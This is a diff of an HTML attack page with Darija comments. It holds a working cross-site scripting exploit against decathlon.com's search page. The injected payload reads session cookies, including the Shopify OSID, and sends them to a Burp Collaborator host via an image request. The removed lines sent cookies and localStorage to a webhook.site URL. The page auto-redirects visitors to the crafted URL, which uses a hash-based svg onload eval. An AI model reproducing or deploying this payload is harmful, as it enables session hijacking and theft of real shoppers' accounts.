@@ -2,29 +2,24 @@
 <html>
 <body>
     <script>
-        // الكود اللي غيتنفذ وسط Decathlon
+        // سكريبت كيهز الـ Shopify OSID والـ Cookies لـ Burp
         let payload = `
             (function(){
-                // جمع الكوكيز والـ OSID والـ Shopify Data
-                var d = {
-                    c: document.cookie,
-                    ls: JSON.stringify(localStorage),
-                    h: window.location.href
-                };
-                // تشفير الداتا باش السيرفر ما يتبلوكاهاش فـ الطريق
-                var secret = btoa(unescape(encodeURIComponent(JSON.stringify(d))));
+                // سحب الـ OSID بوحدو باش يجينا ساهل فـ القراية
+                var osid = document.cookie.match(/osid=([^;]+)/)?.[1] || "not_found";
+                var shop = document.cookie.match(/_shopify_y=([^;]+)/)?.[1] || "not_found";
                 
-                // الرابط ديال Webhook ديالك الجديد
-                var web = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0"; 
+                // الرابط ديال Burp Collaborator
+                var collab = "https://ct9ur0ilhbh2zhgrp7vq89d27tdk1gp5.oastify.com";
                 
-                // الهروب الكبير: تحويل الصفحة بالكامل للـ Webhook مع الداتا
-                document.location = web + "?data=" + secret;
+                // صيفط الداتا فـ الرابط ديال تصويرة
+                var i = new Image();
+                i.src = collab + "/?osid=" + osid + "&shop=" + shop + "&all=" + btoa(document.cookie).substring(0,100);
             })();
         `;
 
         let encoded = encodeURIComponent(payload);
-
-        // الرابط اللي غيستغل ثغرة الـ Hash
+        // استغلال الـ Hash (#) اللي نفعنا فـ الباي باس
         let target = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encoded + "'))>";
 
         window.location.href = target;
